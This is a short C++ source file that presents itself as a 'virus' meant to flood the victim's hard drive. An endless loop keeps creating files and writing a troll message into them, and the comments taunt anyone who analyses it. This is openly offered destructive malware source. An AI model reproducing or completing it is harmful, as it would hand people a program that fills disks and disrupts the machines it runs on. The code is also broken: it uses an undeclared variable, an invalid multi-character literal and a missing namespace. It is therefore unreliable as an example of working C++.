#include <iostream>
#include <fstream>
#include <cstdlib>
#include <string>

/*
* A little message for anyone who decides to analyse the virus
*
* Level 3 - Karma's a real cunt (Especially when is comes to flooding your hard drive)
*/

char msg[] = "Luigi is comming for you...";

/* 
* Main script
*/

int main(int argc, const char *argv[]) {
 
  while (true) {                                          // To infinity and beyond
    ofstream newFile (('cool' + x.c_str()).c_str());      // New file

    if (newFile.is_open()) {                              // If the file is open
      newFile << "Looooooool - Time to empty your hardrive";   // Add a troll message
    }
  }
  
 return 0;
}
